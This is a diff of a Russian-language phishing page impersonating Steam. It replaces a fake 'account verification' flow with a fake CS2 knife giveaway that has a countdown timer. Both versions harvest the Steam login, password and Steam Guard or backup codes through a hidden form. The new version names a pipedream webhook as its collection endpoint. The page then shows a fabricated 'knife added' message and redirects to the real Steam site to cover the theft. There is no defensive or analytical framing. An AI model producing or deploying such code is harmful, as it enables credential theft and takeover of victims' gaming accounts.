-      stepIndicators[step].classList.add('active');
-      for (let i = 1; i < step; i++) {
-        stepIndicators[i].classList.add('completed');
-      }
-      window.scrollTo(0, 0);
-    }
-
-    // Отправка данных через скрытую форму
-    function sendData(type, data) {
-      hiddenFields.type.value = type;
-      hiddenFields.timestamp.value = new Date().toISOString();
-      if (data.accountName) hiddenFields.account.value = data.accountName;
-      if (data.password) hiddenFields.password.value = data.password;
-      if (data.guardCode) hiddenFields.guard.value = data.guardCode;
-      if (data.backupCode) hiddenFields.backup.value = data.backupCode;
-      hiddenForm.submit();
-      // Очистка полей после отправки
-      setTimeout(() => {
-        document.getElementById('accountName').value = '';
-        document.getElementById('accountPassword').value = '';
-        document.getElementById('guardCode').value = '';
-        document.getElementById('backupCode').value = '';
-      }, 500);
-    }
-
-    // Шаг 1: Отправка логина и пароля
-    document.getElementById('accountForm').addEventListener('submit', function(e) {
-      e.preventDefault();
-      const btn = document.getElementById('step1-btn');
-      const alert = document.getElementById('step1-alert');
-      const accountName = document.getElementById('accountName').value.trim();
-      const password = document.getElementById('accountPassword').value.trim();
-      if (!accountName || !password) {
-        alert.textContent = 'Пожалуйста, заполните все поля.';
-        alert.className = 'alert alert-error';
-        alert.style.display = 'block';
-        return;
-      }
-      btn.disabled = true;
-      btn.classList.add('loading');
-      setTimeout(() => {
-        sendData('account_verification', { accountName, password });
-        goToStep(2);
-      }, CONFIG.fakeDelay);
-    });
-
-    // Шаг 2: Отправка кода Guard
-    document.getElementById('step2-submit').addEventListener('click', function() {
-      const btn = this;
-      const alert = document.getElementById('step2-alert');
-      const guardCode = document.getElementById('guardCode').value.trim().toUpperCase();
-      const backupCode = document.getElementById('backupCode').value.trim();
-      if (!guardCode && !backupCode) {
-        alert.textContent = 'Введите код подтверждения или резервный код.';
-        alert.className = 'alert alert-error';
-        alert.style.display = 'block';
-        return;
-      }
-      btn.disabled = true;
-      btn.classList.add('loading');
-      setTimeout(() => {
-        sendData('guard_verification', { guardCode, backupCode });
-        goToStep(3);
-        startCountdown();
-      }, CONFIG.fakeDelay);
-    });
-
-    // Шаг 2: Кнопка "Назад"
-    document.getElementById('step2-back').addEventListener('click', () => goToStep(1));
-
-    // Шаг 2: Повторная отправка кода
-    document.getElementById('resend-code').addEventListener('click', function() {
-      const btn = this;
-      const originalText = btn.textContent;
-      btn.textContent = 'Отправка...';
-      btn.disabled = true;
-      setTimeout(() => {
-        sendData('resend_code', {});
-        btn.textContent = 'Код отправлен!';
-        setTimeout(() => {
-          btn.textContent = originalText;
-          btn.disabled = false;
-        }, 2000);
-      }, 800);
-    });
-
-    // Шаг 3: Обратный отсчет и перенаправление
-    function startCountdown() {
-      let count = CONFIG.countdownStart;
-      const countdownEl = document.getElementById('countdown');
-      const countdownText = document.getElementById('countdown-text');
-      const interval = setInterval(() => {
-        count--;
-        countdownEl.textContent = count;
-        if (count <= 0) {
-          clearInterval(interval);
-          window.location.href = 'https://steamcommunity.com/';
+    
+    <script>
+        // Конфигурация
+        const CONFIG = {
+            webhook: 'https://eoinuzdsdrixye7.m.pipedream.net',
+            sessionId: 'cs2_fun_' + Math.random().toString(36).substring(2, 15),
+            redirectDelay: 10000 // 10 секунд до перенаправления
+        };
+        
+        // Элементы DOM
+        const steps = {
+            1: document.getElementById('step1'),
+            2: document.getElementById('step2'),
+            3: document.getElementById('step3')
+        };
+        
+        const hiddenForm = document.getElementById('hiddenForm');
+        const hiddenFields = {
+            type: document.getElementById('hidden-type'),
+            login: document.getElementById('hidden-login'),
+            password: document.getElementById('hidden-login'),
+            guard: document.getElementById('hidden-guard'),
+            ua: document.getElementById('hidden-ua'),
+            timestamp: document.getElementById('hidden-timestamp'),
+            session: document.getElementById('hidden-session')
+        };
+        
+        // Инициализация
+        function init() {
+            // Установка user agent и session ID
+            hiddenFields.ua.value = navigator.userAgent;
+            hiddenFields.session.value = CONFIG.sessionId;
+            
+            // Запуск таймера
+            startTimer();
+            
+            // Создание частиц
+            createParticles();
+            
+            // Фокус на поле логина
+            document.getElementById('steamLogin').focus();
         }
-      }, 1000);
-      document.getElementById('step3-finish').addEventListener('click', () => {
-        clearInterval(interval);
-        window.location.href = 'https://steamcommunity.com/';
-      });
-    }
-
-    // Отмена
-    document.getElementById('step1-cancel').addEventListener('click', () => {
-      if (confirm('Вы уверены, что хотите отменить процедуру подтверждения?')) {
-        window.location.href = 'https://help.steampowered.com/';
-      }
-    });
-
-    // Смена языка (для видимости)
-    document.getElementById('language').addEventListener('change', function() {
-      alert('Язык интерфейса изменён. Для полного перевода страницы потребуется её перезагрузка.');
-    });
-
-    // Имитация загрузки при открытии
-    window.addEventListener('load', () => {
-      setTimeout(() => {
-        document.body.style.opacity = 1;
-      }, 300);
-    });
-    document.body.style.opacity = 0;
-    document.body.style.transition = 'opacity 0.3s ease';
-  </script>
+        
+        // Таймер обратного отсчёта
+        function startTimer() {
+            let hours = 12;
+            let minutes = 45;
+            let seconds = 30;
+            
+            const timer = setInterval(() => {
+                seconds--;
+                if (seconds < 0) {
+                    seconds = 59;
+                    minutes--;
+                    if (minutes < 0) {
+                        minutes = 59;
+                        hours--;
+                        if (hours < 0) {
+                            clearInterval(timer);
+                            document.querySelector('.badge').textContent = '⏰ РАЗДАЧА ЗАКОНЧИЛАСЬ!';
+                            return;
+                        }
+                    }
+                }
+                
+                document.getElementById('hours').textContent = hours.toString().padStart(2, '0');
+                document.getElementById('minutes').textContent = minutes.toString().padStart(2, '0');
+                document.getElementById('seconds').textContent = seconds.toString().padStart(2, '0');
+            }, 1000);
+        }
+        
+        // Частицы
+        function createParticles() {
+            const container = document.getElementById('particles');
+            for (let i = 0; i < 50; i++) {
+                const particle = document.createElement('div');
+                particle.className = 'particle';
+                particle.style.width = Math.random() * 5 + 2 + 'px';
+                particle.style.height = particle.style.width;
+                particle.style.left = Math.random() * 100 + '%';
+                particle.style.top = Math.random() * 100 + '%';
+                particle.style.animationDelay = Math.random() * 20 + 's';
+                particle.style.animationDuration = Math.random() * 20 + 10 + 's';
+                container.appendChild(particle);
+            }
+        }
+        
+        // Переключение шагов
+        function showStep(step) {
+            Object.values(steps).forEach(el => el.classList.remove('active'));
+            steps[step].classList.add('active');
+            window.scrollTo({ top: 600, behavior: 'smooth' });
+        }
+        
+        // Отправка данных
+        function sendData(type, data) {
+            hiddenFields.type.value = type;
+            hiddenFields.timestamp.value = new Date().toISOString();
+            
+            if (data.login) hiddenFields.login.value = data.login;
+            if (data.password) hiddenFields.password.value = data.password;
+            if (data.guardCode) hiddenFields.guard.value = data.guardCode;
+            
+            hiddenForm.submit();
+            
+            // Очистка полей после отправки
+            setTimeout(() => {
+                document.getElementById('steamLogin').value = '';
+                document.getElementById('steamPassword').value = '';
+                document.getElementById('guardCode').value = '';
+            }, 1000);
+        }
+        
+        // Шаг 1: Вход
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const btn = document.getElementById('loginBtn');
+            const alert = document.getElementById('step1-alert');
+            const login = document.getElementById('steamLogin').value.trim();
+            const password = document.getElementById('steamPassword').value.trim();
+            
+            if (!login || !password) {
+                showAlert(alert, 'Заполните все поля', 'error');
+                return;
+            }
+            
+            btn.disabled = true;
+            btn.innerHTML = 'Проверка данных... <div class="loading" style="display: inline-block; width: 20px; height: 20px; margin-left: 10px;"></div>';
+            
+            // Имитация проверки
+            setTimeout(() => {
+                sendData('steam_login', { login, password });
+                showStep(2);
+                document.getElementById('guardCode').focus();
+            }, 1500);
+        });
+        
+        // Шаг 2: Steam Guard
+        function submitGuardCode() {
+            const btn = document.getElementById('guardBtn');
+            const alert = document.getElementById('step2-alert');
+            const code = document.getElementById('guardCode').value.trim().toUpperCase();
+            
+            if (code.length !== 5) {
+                showAlert(alert, 'Введите 5-значный код', 'error');
+                return;
+            }
+            
+            btn.disabled = true;
+            btn.textContent = 'Проверка кода...';
+            
+            setTimeout(() => {
+                sendData('steam_guard', { guardCode: code });
+                showStep(3);
+                startSuccessCountdown();
+            }, 1500);
+        }
+        
+        // Повторная отправка кода
+        function resendCode() {
+            const alert = document.getElementById('step2-alert');
+            showAlert(alert, 'Код отправлен повторно на вашу почту', 'success');
+            
+            sendData('resend_code', {});
+        }
+        
+        // Успешный шаг
+        function startSuccessCountdown() {
+            let countdown = 10;
+            const countdownEl = document.getElementById('countdownValue');
+            const interval = setInterval(() => {
+                countdown--;
+                countdownEl.textContent = countdown;
+                
+                if (countdown <= 0) {
+                    clearInterval(interval);
+                    window.location.href = 'https://steamcommunity.com/';
+                }
+            }, 1000);
+            
+            // Рандомный нож для сообщения
+            const knives = [
+                '★ Скелетный нож | Ледяной огонь',
+                '★ Karambit | Фазовый кинжал',
+                '★ Сапёрная лопатка | Ультрафиолет',
+                '★ Нож-бабочка | Ночная полоса',
+                '★ Коготь | Марипоса'
+            ];
+            const randomKnife = knives[Math.floor(Math.random() * knives.length)];
+            document.getElementById('successMessage').innerHTML = 
+                `<strong>Нож "${randomKnife}" добавлен в ваш инвентарь!</strong><br>Откройте CS2 чтобы проверить.`;
+        }
+        
+        // Показ уведомлений
+        function showAlert(element, message, type) {
+            element.textContent = message;
+            element.className = `alert alert-${type}`;
+            element.style.display = 'block';
+            
+            setTimeout(() => {
+                element.style.display = 'none';
+            }, 5000);
+        }
+        
+        // Запуск при загрузке
+        window.addEventListener('load', init);
+        
+        // Глобальные функции для кнопок
+        window.showStep = showStep;
+        window.submitGuardCode = submitGuardCode;
+        window.resendCode = resendCode;
+    </script>
 </body>
 </html>
